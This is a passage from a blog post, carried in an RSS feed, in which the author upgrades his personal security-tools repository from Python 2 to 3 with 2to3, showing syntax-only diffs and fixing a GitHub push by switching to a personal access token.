+<p>First, I ran the tool on my entire SecurityTools repository. I wrote most of my tools in Python, so I figured that there would be plenty of changes to make.</p>
+<p>As you can see, most of the changes were related to the Python 3 <a href="https://docs.python.org/3/whatsnew/3.0.html">print function</a>.</p>
+<pre class="console">
+<span class="prompt">root@kali</span>:<span class="dir">~/tools/SecurityTools</span>$ 2to3- .
+RefactoringTool: Skipping implicit fixer: buffer
+RefactoringTool: Skipping implicit fixer: idioms
+RefactoringTool: Skipping implicit fixer: set_literal
+RefactoringTool: Skipping implicit fixer: ws_comma
+RefactoringTool: Refactored ./AlexaPortScanner/alexaPortScanner.py
+--- ./AlexaPortScanner/alexaPortScanner.py	(original)
++++ ./AlexaPortScanner/alexaPortScanner.py	(refactored)
+@@ -1,4 +1,4 @@
+-from __future__ import print_function
++
+ import socket
+ import sys
+ 
+RefactoringTool: Refactored ./BinToHex/binToHex.py
+--- ./BinToHex/binToHex.py	(original)
++++ ./BinToHex/binToHex.py	(refactored)
+@@ -14,4 +14,4 @@
+ 			ctr = 0
+ 		ctr += 1
+ 	shellcode += "\""
+-	print shellcode
++	print(shellcode)
+RefactoringTool: Refactored ./BurpVERBalyzer/VERBalyzer.py
+--- ./BurpVERBalyzer/VERBalyzer.py	(original)
++++ ./BurpVERBalyzer/VERBalyzer.py	(refactored)
+@@ -25,7 +25,7 @@
+     from org.python.core.util import StringUtil
+     import string
+ except ImportError:
+-    print "Failed to load dependencies."
++    print("Failed to load dependencies.")
+ 
+ VERSION = "1.0"
+ callbacks = None
+@@ -75,7 +75,7 @@
+         callbacks.registerScannerInsertionPointProvider(self)
+         callbacks.registerScannerCheck(self)
+ 
+-        print "Successfully loaded VERBalyzer v" + VERSION
++        print("Successfully loaded VERBalyzer v" + VERSION)
+         return
+ 
+     # helper method to search a response for occurrences of a literal match string
+
+... &lt;snip&gt; ...
+
+RefactoringTool: Files that need to be modified:
+RefactoringTool: ./AlexaPortScanner/alexaPortScanner.py
+RefactoringTool: ./BinToHex/binToHex.py
+RefactoringTool: ./BurpVERBalyzer/VERBalyzer.py
+RefactoringTool: ./DNSRickroll/dnsRickroll.py
+RefactoringTool: ./ECBPlaintextAttack/ecbAttack.py
+RefactoringTool: ./ECBPlaintextAttack/ecbServer.py
+RefactoringTool: ./FileIntegrity/fileintegrity.py
+RefactoringTool: ./IpExpander/ipExpander.py
+RefactoringTool: ./PortScanner/portScanner.py
+RefactoringTool: ./PyDHCPDiscover/dhcpdiscover.py
+RefactoringTool: ./PythonShellcode/pythonShellcode.py
+RefactoringTool: ./RSAGenKey/genKey.py
+RefactoringTool: ./ReverseShell/reverseShell.py
+RefactoringTool: ./ZipCracker/zipCracker.py
+</pre>
+<p>The only file that had other changes was my old <a href="https://www.doyler.net/security-not-included/file-integrity-checker">file integrity checker</a>.</p>
+<pre class="console">
+<span class="prompt">root@kali</span>:<span class="dir">~/tools/SecurityTools</span>$ 2to3- ./FileIntegrity/fileintegrity.py
+RefactoringTool: Skipping implicit fixer: buffer
+RefactoringTool: Skipping implicit fixer: idioms
+RefactoringTool: Skipping implicit fixer: set_literal
+RefactoringTool: Skipping implicit fixer: ws_comma
+RefactoringTool: Refactored ./FileIntegrity/fileintegrity.py
+--- ./FileIntegrity/fileintegrity.py	(original)
++++ ./FileIntegrity/fileintegrity.py	(refactored)
+@@ -6,7 +6,7 @@
+ import requests
+ import shutil
+ import smtplib
+-from urlparse import urlparse
++from urllib.parse import urlparse
+ 
+ def calculateOriginalValues(fileUrl, tempFile):
+     r = requests.get(fileUrl)
+@@ -21,10 +21,10 @@
+         calculated_md5 = hashlib.md5(f.read()).hexdigest()
+ 
+     if originalHash == calculated_md5:
+-        print "MD5 verified."
++        print("MD5 verified.")
+         return None
+     else:
+-        print "MD5 verification failed!"
++        print("MD5 verification failed!")
+         
+         file1 = open(fileName, "rb").readlines()
+         file2 = open(originalFile, "rb").readlines()
+@@ -44,7 +44,7 @@
+         
+         try:
+             while 1:
+-                diff_string = diff.next()
++                diff_string = next(diff)
+                 if not (diff_string[0] == " "):
+                     differences += diff_string + "\r\n"
+             if diff is None:
+@@ -55,7 +55,7 @@
+ 
+ def sendEmail(configFile, diffString, isSSL, hasAuth):
+     config = {}
+-    execfile(configFile, config) 
++    exec(compile(open(configFile).read(), configFile, 'exec'), config) 
+ 
+     sender = config["sender"]
+     recipient = config["recipient"]
+RefactoringTool: Files that need to be modified:
+RefactoringTool: ./FileIntegrity/fileintegrity.py
+</pre>
+<p>Other than iterators and print methods, I had to learn how to update my <a href="https://stackoverflow.com/questions/436198/what-is-an-alternative-to-execfile-in-python-3">execfile call</a>.</p>
+<p>After looking at the official <a href="https://docs.python.org/3.3/whatsnew/3.0.html?highlight=execfile#builtins">documentation</a>, I updated my code to reflect the 2to3 suggestions exactly.</p>
+<h2>Committing the Changes</h2>
+<p>When I finished my changes, I went to commit the changes to my repository.</p>
+<p>Unfortunately, I was getting an authentication error when I tried to use the git command line tool.</p>
+<pre class="console">
+<span class="prompt">root@kali</span>:<span class="dir">~/tools/SecurityTools</span>$ git add .
+<span class="prompt">root@kali</span>:<span class="dir">~/tools/SecurityTools</span>$ git commit -m "Updated SecurityTools for Python3"
+[master b5bdff4] Updated SecurityTools for Python3
+ 12 files changed, 66 insertions(+), 67 deletions(-)
+<span class="prompt">root@kali</span>:<span class="dir">~/tools/SecurityTools</span>$ git push origin master
+Username for 'https://github.com': doyler
+Password for 'https://doyler@github.com': 
+remote: Invalid username or password.
+fatal: Authentication failed for 'https://github.com/doyler/SecurityTools.git/'
+</pre>
+<p>I rarely used this for GitHub, so I had to poke around to see why it wasn't working.</p>
+<p>As it turns out, I needed to use a <a href="https://help.github.com/en/github/authenticating-to-github/creating-a-personal-access-token-for-the-command-line">personal access token</a>, as opposed to my password.</p>
+<p>Once I fixed this, I was able to commit my changes just fine!</p>
+<pre class="console">
+<span class="prompt">root@kali</span>:<span class="dir">~/tools/SecurityTools</span>$ git push origin master
+Username for 'https://github.com': doyler
+Password for 'https://doyler@github.com': 
+Enumerating objects: 49, done.
+Counting objects: 100% (49/49), done.
+Delta compression using up to 16 threads
+Compressing objects: 100% (25/25), done.
+Writing objects: 100% (25/25), 3.02 KiB | 1.51 MiB/s, done.
+Total 25 (delta 14), reused 0 (delta 0)
+remote: Resolving deltas: 100% (14/14), completed with 14 local objects.
+To https://github.com/doyler/SecurityTools.git
+   e082b9f..b5bdff4  master -&gt; master
+</pre>
+<p>As you can see, the <a href="https://github.com/doyler/SecurityTools/commit/b5bdff458df12722032cdeed6b154de95e2ef152">commit</a> went through, and I updated my repository.</p>
+<p><a href="https://www.doyler.net/wp-content/uploads/2to3/2to3-1-commit.png"><img src="https://www.doyler.net/wp-content/uploads/2to3/2to3-1-commit-1024x192.png" alt="Python 2to3 - Commit" width="500" height="94" class="alignnone size-large wp-image-4759" srcset="https://www.doyler.net/wp-content/uploads/2to3/2to3-1-commit-1024x192.png 1024w, https://www.doyler.net/wp-content/uploads/2to3/2to3-1-commit-300x56.png 300w, https://www.doyler.net/wp-content/uploads/2to3/2to3-1-commit-768x144.png 768w, https://www.doyler.net/wp-content/uploads/2to3/2to3-1-commit-1536x288.png 1536w, https://www.doyler.net/wp-content/uploads/2to3/2to3-1-commit.png 1620w" sizes="(max-width: 500px) 100vw, 500px" /></a></p>
+<h2>Python 2to3 - Conclusion</h2>
+<p>I should have updated my repositories sooner, but this was something that I was putting off.</p>
+<p>There is still some code in other repositories that I will need to update but let me know if you actually use/need any of it.</p>
+<p>Finally, let me know if there are any updates that you'd like to see to any of these tools, or new tools in general!</p>
+<p>The post <a rel="nofollow" href="https://www.doyler.net/security-not-included/python-2to3-upgrade">Using Python 2to3 to Easily Upgrade (Finally)</a> appeared first on <a rel="nofollow" href="https://www.doyler.net">doyler.net</a>.</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>https://www.doyler.net/security-not-included/python-2to3-upgrade/feed</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+		<post-id xmlns="com-wordpress:feed-additions:1">4744</post-id>	</item>
+	</channel>
+</rss>
+
+<!--
+Performance optimized by W3 Total Cache. Learn more: https://www.w3-edge.com/products/
+
+Object Caching 152/154 objects using disk
+Page Caching using disk: enhanced (SSL caching disabled) 
+Minified using disk
+Database Caching using disk
+
+Served from: www.doyler.net @ 2020-04-06 09:14:55 by W3 Total Cache
+-->
